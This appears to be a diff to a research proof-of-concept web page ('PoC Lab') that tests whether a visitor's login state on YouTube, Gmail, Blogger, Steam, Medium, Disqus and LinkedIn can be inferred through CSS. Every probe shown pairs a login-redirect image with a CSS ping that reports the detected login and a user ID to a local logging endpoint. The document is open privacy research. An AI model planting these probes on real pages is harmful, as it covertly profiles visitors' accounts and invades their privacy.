@@ -64,11 +64,18 @@
                 <h1>
                     <a style="color: inherit; text-shadow: inherit;" href="/">PoC Lab</a>
                 </h1>
-                <h2></h2>
+
+				<h5>
+					<a style="color: inherit; text-shadow: inherit;" href="/poc.html">Social Media Detection</a> |
+          			<a style="color: inherit; text-shadow: inherit;" href="/chrome.html">Chrome Extension Detection</a>
+				</h5>
             </div>
         </header>
         <div class="container">
             <section id="main_content">
+				<p>
+					User ID: {{USER_ID}}
+				</p>
 				<p>
 					This study is conducted as part of academic research in the field of web security and privacy.
 The purpose of this experiment is to evaluate whether login-state information of selected web services can be inferred through browser-side CSS behavior.
@@ -77,7 +84,7 @@ The purpose of this experiment is to evaluate whether login-state information of
                     <thead>
                         <tr>
                             <th>Platforms</th>
-                            <th>Side-channel payload (inspect element to better understanding)</th>
+                            <th>Side-channel payload</th>
                         </tr>
                     </thead>
                     <tbody>
@@ -91,9 +98,10 @@ The purpose of this experiment is to evaluate whether login-state information of
 										<img src="https://accounts.google.com/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube" alt="">
 									</div>
 									<div class="container-yt">
-										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_youtube_detected!');"></div>
+										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_youtube_detected!&user_id={{USER_ID}}');"></div>
 									</div>
 								</div>
+								<input type="text" value="https://accounts.google.com/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube" style='width:80%'>
                             </td>
                         </tr>
 
@@ -107,9 +115,10 @@ The purpose of this experiment is to evaluate whether login-state information of
 										<img src="https://accounts.google.com/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail" alt="">
 									</div>
 									<div class="container-gmail">
-										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_gmail_detected!');"></div>
+										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_gmail_detected!&user_id={{USER_ID}}');"></div>
 									</div>
 								</div>
+								<input type="text" value="https://accounts.google.com/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail" style='width:80%'>
                             </td>
                         </tr>
 						
@@ -123,9 +132,10 @@ The purpose of this experiment is to evaluate whether login-state information of
 										<img src="https://accounts.google.com/ServiceLogin?service=blogger&hl=de&passive=1209600&continue=https://www.blogger.com/favicon.ico" alt="">
 									</div>
 									<div class="container-blogger">
-										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_blogger_detected!');"></div>
+										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_blogger_detected!&user_id={{USER_ID}}');"></div>
 									</div>
 								</div>
+								<input type="text" value="https://accounts.google.com/ServiceLogin?service=blogger&hl=de&passive=1209600&continue=https://www.blogger.com/favicon.ico" style='width:80%'>
                             </td>
                         </tr>
 
@@ -139,9 +149,10 @@ The purpose of this experiment is to evaluate whether login-state information of
 										<img src="https://store.steampowered.com/login/?redir=favicon.ico" alt="">
 									</div>
 									<div class="container-steam">
-										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_steam_detected!');"></div>
+										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_steam_detected!&user_id={{USER_ID}}');"></div>
 									</div>
 								</div>
+								<input type="text" value="https://store.steampowered.com/login/?redir=favicon.ico" style='width:80%'>
                             </td>
                         </tr>
 
@@ -155,9 +166,10 @@ The purpose of this experiment is to evaluate whether login-state information of
 										<img src="https://medium.com/m/signin?redirect=https%3A%2F%2Fmedium.com%2Ffavicon.ico&loginType=default" alt="">
 									</div>
 									<div class="container-medium">
-										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_medium_detected!');"></div>
+										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_medium_detected!&user_id={{USER_ID}}');"></div>
 									</div>
 								</div>
+								<input type="text" value="https://medium.com/m/signin?redirect=https%3A%2F%2Fmedium.com%2Ffavicon.ico&loginType=default" style='width:80%'>
                             </td>
                         </tr>
 
@@ -171,12 +183,30 @@ The purpose of this experiment is to evaluate whether login-state information of
 										<img src="https://disqus.com/profile/login/?next=https%3A%2F%2Fdisqus.com%2Ffavicon.ico" alt="">
 									</div>
 									<div class="container-disqus">
-										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_disqus_detected!');"></div>
+										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_disqus_detected!&user_id={{USER_ID}}');"></div>
 									</div>
 								</div>
+								<input type="text" value="https://disqus.com/profile/login/?next=https%3A%2F%2Fdisqus.com%2Ffavicon.ico" style='width:80%'>
                             </td>
                         </tr>
 
+						<tr>
+							<td>
+								LinkedIn
+							</td>
+                            <td>
+                                <div class="wrapper">
+									<div>
+										<img src="https://www.linkedin.com/authwall?sessionRedirect=/favicon.ico" alt="">
+									</div>
+									<div class="container-disqus">
+										<div class="exfil" style="--ping: url('http://127.0.0.1:1337/log?status=login_linkedin_detected!&user_id={{USER_ID}}');"></div>
+									</div>
+								</div>
+								<input type="text" value="https://www.linkedin.com/authwall?sessionRedirect=/favicon.ico" style='width:80%'>
+                            </td>
+                        </tr>
+						
                     </tbody>
                 </table>
             </section>
